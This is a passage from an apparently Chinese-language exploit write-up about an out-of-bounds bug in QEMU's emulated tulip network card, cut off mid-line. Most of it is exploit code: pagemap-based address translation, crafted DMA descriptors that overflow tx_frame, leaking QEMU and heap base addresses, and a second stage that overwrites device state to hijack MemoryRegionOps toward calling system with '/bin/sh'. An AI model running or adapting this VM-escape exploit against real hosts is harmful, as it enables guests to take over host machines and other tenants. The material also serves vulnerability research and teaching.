class="line">        tulip_desc_read(s, s-&gt;current_rx_desc, &amp;desc);</span><br><span class="line">        tulip_dump_rx_descriptor(s, &amp;desc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(desc.status &amp; RDES0_OWN)) &#123;</span><br><span class="line">            s-&gt;csr[<span class="number">5</span>] |= CSR5_RU;</span><br><span class="line">            tulip_update_int(s);</span><br><span class="line">            <span class="keyword">return</span> s-&gt;rx_frame_size - s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        desc.status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;rx_frame_len) &#123;</span><br><span class="line">            s-&gt;rx_frame_size = size + <span class="number">4</span>;</span><br><span class="line">            s-&gt;rx_status = RDES0_LS |</span><br><span class="line">                 ((s-&gt;rx_frame_size &amp; RDES0_FL_MASK) &lt;&lt; RDES0_FL_SHIFT);</span><br><span class="line">            desc.status |= RDES0_FS;</span><br><span class="line">            <span class="built_in">memcpy</span>(s-&gt;rx_frame, buf, size);</span><br><span class="line">            s-&gt;rx_frame_len = s-&gt;rx_frame_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tulip_copy_rx_bytes(s, &amp;desc); <span class="comment">/* 将接收到的数据从接收缓冲区复制到用户提供的缓冲区中 */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;rx_frame_len) &#123;</span><br><span class="line">            desc.status |= s-&gt;rx_status;</span><br><span class="line">            s-&gt;csr[<span class="number">5</span>] |= CSR5_RI;</span><br><span class="line">            tulip_update_int(s);</span><br><span class="line">        &#125;</span><br><span class="line">        tulip_dump_rx_descriptor(s, &amp;desc);</span><br><span class="line">        tulip_desc_write(s, s-&gt;current_rx_desc, &amp;desc);</span><br><span class="line">        tulip_next_rx_descriptor(s, &amp;desc);</span><br><span class="line">    &#125; <span class="keyword">while</span> (s-&gt;rx_frame_len);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>函数 <code>tulip_copy_rx_bytes</code> 的作用和 <code>tulip_copy_tx_buffers</code> 相反：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_rx_bytes</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; RDES1_BUF1_SIZE_SHIFT) &amp; RDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; RDES1_BUF2_SIZE_SHIFT) &amp; RDES1_BUF2_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len1)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;rx_frame + (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        <span class="comment">/* 从主机内存rx_frame + rx_frame_size - rx_frame_len处读取数据 */</span></span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len2)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr2, s-&gt;rx_frame + (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>tulip_copy_rx_bytes</code> 中也同样没有检查 size 范围，可以将 <code>rx_frame</code> 后的数据读取到用户空间</li>
</ul>
<p>核心结构体 <code>tulip_descriptor</code> 的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tulip_descriptor</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> status;</span><br><span class="line">    <span class="keyword">uint32_t</span> control;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_addr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 <code>tulip_xmit_list_update</code> 中会从 <code>current_tx_desc</code> 中读取网络适配器的描述符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tulip_desc_read(s, s-&gt;current_tx_desc, &amp;desc); <span class="comment">/* 从s-&gt;current_tx_desc中读取网络适配器的描述符,并写入desc */</span></span><br><span class="line">tulip_dump_tx_descriptor(s, &amp;desc); </span><br></pre></td></tr></table></figure>
<ul>
<li>此时 <code>tulip_desc_read</code> 函数需要传入物理地址</li>
</ul>
<p>我们可以通过 <code>/proc/self/pagemap</code> 计算出物理地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果我们将 <code>tx_frame_len</code> 设置为 0x800，那么接下来往 <code>tx_frame[2048]</code> 中写的数据就可能会向下溢出</p>
<p>下面是测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); </span><br><span class="line"><span class="comment">/* (1UL &lt;&lt; 29)为TDES1_FS: 执行&quot;tx_frame_len = 0&quot; */</span></span><br><span class="line">tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">/* (1u &lt;&lt; 13)为CSR6_ST: 设置CSR5_TS_SUSPENDED */</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x400 */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);   </span><br><span class="line">tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x800 */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接着我们就可以通过 <code>pci_dma_read</code> 函数修改 <code>TULIPState-&gt;tx_frame</code> 往后的数据，然后利用 <code>pci_dma_write</code> 泄露数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">pmio_write(CSR(<span class="number">6</span>), <span class="number">0x800</span> | (<span class="number">1u</span> &lt;&lt; <span class="number">13</span>) | (<span class="number">1u</span> &lt;&lt; <span class="number">1</span>));</span><br><span class="line"><span class="comment">/* 0x800: 使&quot;s-&gt;csr[6] &gt;&gt; CSR6_OM_SHIFT) &amp; CSR6_OM_MASK&quot;成立,从而使tulip_tx能够调用tulip_receive */</span></span><br><span class="line"><span class="comment">/* (1u &lt;&lt; 13)为CSR6_ST: 设置CSR5_TS_SUSPENDED */</span></span><br><span class="line"><span class="comment">/* (1u &lt;&lt; 1)为CSR6_SR: 设置CSR5_RS_RUNNING_WAIT_RECEIVE */</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] OOB write tx_frame_len...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> rx_len1, rx_len2;</span><br><span class="line">rx_len1 = <span class="number">0x400</span>;</span><br><span class="line">rx_len2 = <span class="number">0</span>;</span><br><span class="line">rx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// RDES0_OWN</span></span><br><span class="line">rx_desc-&gt;buf_addr1  = gva_to_gpa(recv_buf);</span><br><span class="line">rx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">rx_desc-&gt;control    = rx_len2 | rx_len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set rx descriptor</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> rx_desc_gpa = gva_to_gpa(rx_desc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] rx_desc_gpa: 0x%lx\n&quot;</span>, rx_desc_gpa);</span><br><span class="line">pmio_writel(CSR(<span class="number">3</span>), rx_desc_gpa); <span class="comment">/* 设置rx_desc */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> &#123;</span> <span class="comment">/* 描述TULIPState-&gt;tx_frame的后续数据 */</span></span><br><span class="line">    <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">    <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br><span class="line">len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">oob_data-&gt;tx_frame_len = <span class="number">0x400</span> - len1; <span class="comment">/* 伪造&gt;tx_frame_len为0x400 */</span></span><br><span class="line">oob_data-&gt;rx_frame_len = <span class="number">0x900</span>;</span><br><span class="line">oob_data-&gt;rx_frame_size = <span class="number">2048</span>*<span class="number">2</span> + <span class="number">0x900</span>; <span class="comment">/* 使rx_frame发生溢出 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff</span></span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set tx descriptor</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 设置tx_desc(覆盖TULIPState) */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] leak\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> *cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx 0x%016lx\n&quot;</span>, *(<span class="keyword">size_t</span> *)cur, *(<span class="keyword">size_t</span> *)(cur+<span class="number">8</span>));</span><br><span class="line">    cur += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line">cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line"><span class="keyword">uint64_t</span> qemu_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">0x1d</span>] - <span class="number">0x755f9f</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">22</span>] - <span class="number">0xe11380</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> qemu_plt_system = qemu_base+<span class="number">2859620</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> frame_base = heap_base+<span class="number">0xe0fcf0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] continue...\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_base: 0x%lx\n&quot;</span>, qemu_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] heap_base: 0x%lx\n&quot;</span>, heap_base);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>泄露 libc_base 和 heap_base 以后，我们就可以劫持并伪造 <code>TULIPState-&gt;MemoryRegion-&gt;MemoryRegionOps</code> 来执行我们需要的函数： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">const</span> MemoryRegionOps *ops;</span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage2\n&quot;</span>); &#123;</span><br><span class="line">    len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    <span class="comment">/* (1UL &lt;&lt; 29)为TDES1_FS: 执行&quot;tx_frame_len = 0&quot; */</span></span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">/* (1u &lt;&lt; 13)为CSR6_ST: 设置CSR5_TS_SUSPENDED */</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x400 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 读取tx_desc为网络适配器的描述符,tx_frame_len将变为0x800 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">    </span><br><span class="line">    len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">    oob_data-&gt;tx_frame_len = <span class="number">-0x3350</span> - <span class="number">0x70</span>; <span class="comment">/* 向上溢出 */</span></span><br><span class="line">    oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">    oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa); <span class="comment">/* 设置tx_desc(覆盖TULIPState) */</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> *binsh = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span 